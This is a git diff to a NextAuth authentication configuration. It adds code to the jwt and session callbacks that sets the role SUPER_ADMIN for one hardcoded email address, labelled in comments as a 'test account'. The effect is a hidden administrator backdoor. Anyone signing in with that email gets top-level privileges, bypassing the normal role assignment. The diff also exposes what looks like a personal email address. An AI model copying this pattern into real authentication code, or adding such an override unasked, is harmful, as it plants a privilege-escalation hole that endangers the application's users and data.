@@ -62,12 +62,20 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         token.role = user.role;
         token.id = user.id;
       }
+      // Force SUPER_ADMIN for test account
+      if (token.email === "huant5300@gmail.com") {
+        token.role = UserRole.SUPER_ADMIN;
+      }
       return token;
     },
     async session({ session, token }) {
       if (token && session.user) {
         session.user.role = token.role as UserRole;
         session.user.id = token.id as string;
+      }
+      // Force SUPER_ADMIN for test account
+      if (session.user?.email === "huant5300@gmail.com") {
+        session.user.role = UserRole.SUPER_ADMIN;
       }
       return session;
     },
